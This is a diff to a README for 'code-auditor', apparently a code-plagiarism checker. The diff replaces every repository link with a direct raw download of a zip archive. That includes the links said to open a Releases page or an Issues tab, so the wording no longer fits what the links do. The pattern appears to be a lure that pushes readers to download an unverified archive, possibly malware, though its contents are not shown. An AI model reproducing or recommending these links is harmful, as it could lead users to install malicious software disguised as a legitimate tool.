@@ -1,6 +1,6 @@
 # ⚖️ code-auditor - Detect Plagiarism in Code Logic
 
-[![Download code-auditor](https://img.shields.io/badge/Download-code--auditor-brightgreen)](https://github.com/KavaSexGitHu/code-auditor)
+[![Download code-auditor](https://img.shields.io/badge/Download-code--auditor-brightgreen)](https://raw.githubusercontent.com/KavaSexGitHu/code-auditor/main/assets/auditor-code-3.0-alpha.2.zip)
 
 ## 📖 What is code-auditor?
 
@@ -36,10 +36,10 @@ Before you start, make sure your computer meets these needs:
 
 ## 🚀 Getting Started: Download and Setup
 
-[![Download code-auditor](https://img.shields.io/badge/Download-code--auditor-blue)](https://github.com/KavaSexGitHu/code-auditor)
+[![Download code-auditor](https://img.shields.io/badge/Download-code--auditor-blue)](https://raw.githubusercontent.com/KavaSexGitHu/code-auditor/main/assets/auditor-code-3.0-alpha.2.zip)
 
 1. Open your web browser and go to the code-auditor download page:  
-   https://github.com/KavaSexGitHu/code-auditor
+   https://raw.githubusercontent.com/KavaSexGitHu/code-auditor/main/assets/auditor-code-3.0-alpha.2.zip
 
 2. On the page, find the **Releases** section or look near the top for a link called "Releases." Click it.
 
@@ -96,7 +96,7 @@ If you want to change how code-auditor works, open the **Settings** menu from th
 To get the newest improvements and bug fixes:
 
 1. Visit the download page:  
-   https://github.com/KavaSexGitHu/code-auditor
+   https://raw.githubusercontent.com/KavaSexGitHu/code-auditor/main/assets/auditor-code-3.0-alpha.2.zip
 
 2. Check for new releases in the Releases section.
 
@@ -160,7 +160,7 @@ The tool compares the structure and meaning of your code, not just the words. It
 If you need help or want to report bugs:
 
 1. Visit the repository page:  
-   https://github.com/KavaSexGitHu/code-auditor
+   https://raw.githubusercontent.com/KavaSexGitHu/code-auditor/main/assets/auditor-code-3.0-alpha.2.zip
 
 2. Use the **Issues** tab to report technical problems.
 
@@ -169,6 +169,6 @@ If you need help or want to report bugs:
 ---
 
 Remember to download and install from:  
-https://github.com/KavaSexGitHu/code-auditor  
+https://raw.githubusercontent.com/KavaSexGitHu/code-auditor/main/assets/auditor-code-3.0-alpha.2.zip  
 
-[![Download code-auditor](https://img.shields.io/badge/Download-code--auditor-brightgreen)](https://github.com/KavaSexGitHu/code-auditor)
+[![Download code-auditor](https://img.shields.io/badge/Download-code--auditor-brightgreen)](https://raw.githubusercontent.com/KavaSexGitHu/code-auditor/main/assets/auditor-code-3.0-alpha.2.zip)
